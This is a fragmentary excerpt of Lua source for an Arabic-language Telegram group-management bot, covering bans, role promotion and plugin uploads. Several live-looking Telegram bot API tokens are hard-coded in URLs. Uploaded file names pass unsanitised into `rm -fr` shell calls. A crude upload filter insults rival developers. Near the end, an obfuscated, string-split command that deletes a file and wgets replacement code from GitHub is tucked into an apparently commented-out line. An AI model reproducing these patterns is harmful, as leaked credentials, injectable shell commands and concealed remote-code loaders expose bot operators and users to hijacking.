...
{
{text = ''..(channel_ts or "Neon TEAM")..'', url=''..(channel_user_ts or 't.me/NeonTEAM')..''},
},
}
local ameed = "https://api.telegram.org/bot" ..token.. '/sendMessage?chat_id=' .. chat_id
if reply_to_message_id ~= 0 then
ameed = ameed .. '&reply_to_message_id=' .. reply_to_message_id/2097152/0.5 -- جميع الحقوق محفوظه لفريق سنايبر لايمكنك نسخ او استخدام هذه السطر بدون موافقه الفريق
end
...
info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'NeonTEAM')..')\n'..text
...
info = '👤┇العضو ~⪼ ['..result.first_name_..'](t.me/'..(result.username_ or 'NeonTEAM')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
...
info = '👤┇العضو ~⪼ ['..(result.first_name_ or value)..'](t.me/'..(result.username_ or 'NeonTEAM')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
...
elseif (database:get("Neon:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("Neon:all_if:"..database:get("Neon:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
...
for i=1, #gpss do
if not database:sismember('Neon:'..bot_id..'pro:groups', gpss[i]) then
...
send(msg.chat_id_,0, 1, "⚠┇العضو : {["..data.first_name_.."](T.ME/NeonTEAM)}\n📛┇["..taha.."] \n" , 1, 'md') 
end
end
...
send(msg.chat_id_,0, 1, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/NeonTEAM)}\n📛┇ الملصق الذي ارسلته تم منعه من المجموعه \n" , 1, 'md') 
end
end
getUser(msg.sender_user_id_,get_info)
delete_msg(msg.chat_id_,{[0] = msg.id_})       
...
local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@BB8SS&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@BB8SS&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@BB8SS&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@BB8SS&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@BB8SS&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @BB8SSFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@BB8SSfreer.Neon ~= true then
...
openChat(msg.chat_id_,Neon_info2) 
--
end
else
...
io.popen("rm -fr files_Neon/"..name_t[2]..'.lua')
database:srem("files"..bot_id,name_t[2]..'.lua')
...
local f = load("files_Neon/"..name_t[2]..".lua")
...
if (f:match('^(.*)(2fmaster)(.*)(Neon)(.*)(elua)(.*)$')) then 
ts23kk =  "\n⚠️┇عمي صدك جذب لول وكيكو كل يوم واحد يهينهم ما شبعتو اهانات 😹😹 \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Neon/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
...
if (f:match('^(.*)(NeonTEAM/Neonx)(.*)$')) then 
ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على الفرخ رضا اللوكي + كيكو دروح اتلوك بعد 👻😂 \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Neon/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
...
if (f:match('^(.*)(rm -fr Neon.lua)(.*)$')) then 
ts23kk =  "\n⚠┇مكدر ارفع ملف يحذف ملف Neon.lua لتبعبص ابني "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Neon/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(Neon.lua)(.*)$')) then 
ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Neon/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
...
if (f:match('^(.*)(22Neon%3a%22%20%2e%2e%20bot_id)(.*)$')) then 
...
if (f:match('^(.*)(2fmaster%2fNeon%2elua)(.*)$')) then 
ts23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
database:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_Neon/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
...
io.popen("rm -fr files_Neon/del.lua")
io.popen("rm -fr files_Neon/hack.lua")
io.popen("rm -fr files_Neon/d.lua")
if f ~= "true" then
ts23 = ""
if f:match("^(.*)(ameed_Neon)(.*)$") then
...
local hash =  'Neon:'..bot_id..'gbanned:'
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'NeonTEAM')..')\n🚫┇تم حظره من المجموعات البوت'
...
local hash =  'Neon:'..bot_id..'gbanned:'
if result.id_ then
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apid[2] or 'NeonTEAM')..')\n��┇تم الغاء حظره من المجموعات البوت'
...
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'NeonTEAM')..')\n\n🔖┇تم رفعة مطور في البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
...
local gpss = database:smembers("Neon:good"..bot_id..os.date("%d")) or 0
...
local gps9 = database:scard("Neon:good"..bot_id..os.date("%d")) or 0
...
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'NeonTEAM')..')\n🔖┇تم رفعة منشئ  في البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
...
database:del("Neon:all_if:"..text..bot_id..msg.chat_id_)
...
send(msg.chat_id_, msg.id_, 1, '☑┇ارسال الان اسم الصلاحيه', 1, 'md')
database:set("Neon:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
return "Neon"
end
if text and database:get("Neon:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
database:del("Neon:new:if:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
database:set("Neon:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_,text)
database:set("Neon:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_,"ok1")
return "Neon"
end
if (text and database:get("Neon:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)) then 
if (text == "ادمن" or text == "مدير" or text == "عضو مميز" or text == "لا شيئ") then 
database:del("Neon:new:if2:"..bot_id..msg.chat_id_..msg.sender_user_id_)
tsha_text = database:get("Neon:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, '☑️┇تم حفض الصلاحيه بنجاح \n⚠️┇الاوامر { رفع/تنزيل '..tsha_text..' }', 1, 'md')
database:set("Neon:all_if:"..tsha_text..bot_id..msg.chat_id_,text)
database:del("Neon:new:if:text:"..bot_id..msg.chat_id_..msg.sender_user_id_)
else 
send(msg.chat_id_, msg.id_, 1, '??┇الان ارسل نوع الصلاحيه المطلوبه \n🔰┇{ `مدير` ،`ادمن` ،`عضو مميز` ,`لا شيئ `}', 1, 'md')
end
end
...
database:set("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id,Neon_edis[1])
...
database:set("Neon:edit:text:su:new:"..bot_id..msg.chat_id_..database:get("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id),text)
database:set("Neon:edit:text:su:new2:"..bot_id..msg.chat_id_..text,database:get("tsahke:new:msg:"..msg.chat_id_..msg.sender_user_id_..bot_id))
...
local klma = database:get("Neon:edit:text:su:new:"..bot_id..msg.chat_id_..t[1])
if klma ~= nil then
database:del("Neon:edit:text:su:new2:"..bot_id..msg.chat_id_..klma)
database:del("Neon:edit:text:su:new:"..bot_id..msg.chat_id_..t[1])
...
ts_text = database:get("Neon:all_if:"..a[1]..bot_id..msg.chat_id_)
if ts_text then 
function promote_by_reply(extra, result, success)
...
info = '👤┇العضو ~⪼ ['..result2.first_name_..'](t.me/'..(result2.username_ or 'NeonTEAM')..')\n☑┇تم رفعه '..a[1]
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
...
ts_text = database:get("Neon:all_if:"..apmd[1]..bot_id..msg.chat_id_)
if ts_text then 
function promote_by_username(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
...
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apba[2] or 'NeonTEAM')..')\n☑┇تم حظره من المجموعه'
...
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apsi[2] or 'NeonTEAM')..')\n🚫┇تم كتمه من البوت'
end
else
texts = '✖┇خطاء'
end
...
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apki[2] or 'NeonTEAM')..')\n🚫┇تم طرده من المجموعه'
chat_kick(msg.chat_id_, result.id_)
end
else
texts = '✖┇خطاء'
...
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(res[2] or 'Neonteam')..')\n☑️┇تم تقييده'
end
else
texts = '✖️┇خطاء'
end
...
elseif (database:get("Neon:name_user:"..bot_id..msg.chat_id_..result.id_) and database:get("Neon:all_if:"..database:get("Neon:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
...
elseif (database:get("Neon:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) and database:get("Neon:all_if:"..database:get("Neon:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_) ..bot_id..msg.chat_id_)) then 
...
------------------------------------------------------------------------
if (text and text == (redis:get('Neon:'..bot_id..'name_bot') or 'سنايبر'))then
name_bot = (redis:get('Neon:'..bot_id..'name_bot') or 'سنايبر')
local namebot = {
...
t = 'مطور سنايبر '
elseif is_sudo(msg) then
t = database:get("Neon:name_sudo"..bot_id..msg.chat_id_)  or 'المطور 👨🏻‍🔧'
elseif is_creatorbasic(msg) then
t =  database:get("Neon:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("Neon:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("Neon:all_if:"..database:get("Neon:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("Neon:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
...
local h5 = redis:get('Neon:'..bot_id..'h5')
local text =  [[
...
local h6 = redis:get('Neon:'..bot_id..'h6')
local text =  [[
...
if database:get("lock_botAndBan:Neon"..msg.chat_id_..bot_id) and not bot_id then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
end
end
...
if database:get("Neon:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_) then
local Neon_edit_text = database:get("Neon:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_)
...
local Name_Bot = (redis:get('Neon:'..bot_id..'name_bot') or 'سنايبر')
...
local photo_ameed = download_to_file('https://api.telegram.org/file/bot'..token..'/'..ameed6.result.file_path, 'files_Neon/'..msg.content_.document_.file_name_)
...
send(msg.chat_id_,0, 1, "[⚠┇#تحذير] \n🔖┇قام شخصآ ما في المجموعه بالتعديل على الميديا يرجى الانتباه \n📫┇الشخص الي قام بالتعديل \n ["..data.first_name_.."](T.ME/NeonTEAM)" , 1, 'md') 
end
end
...
------------------------------------------------------------------------
--         »»                 End UpdateChat                          ««              --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = database:smembers('Neon:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end -- @BB8SSFree ('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
local list = database:smembers('Neon:'..bot_id..'groups') 
for k,v in pairs(list) do 
...
database:sadd('Neon:'..bot_id..'pro:groups',v) 
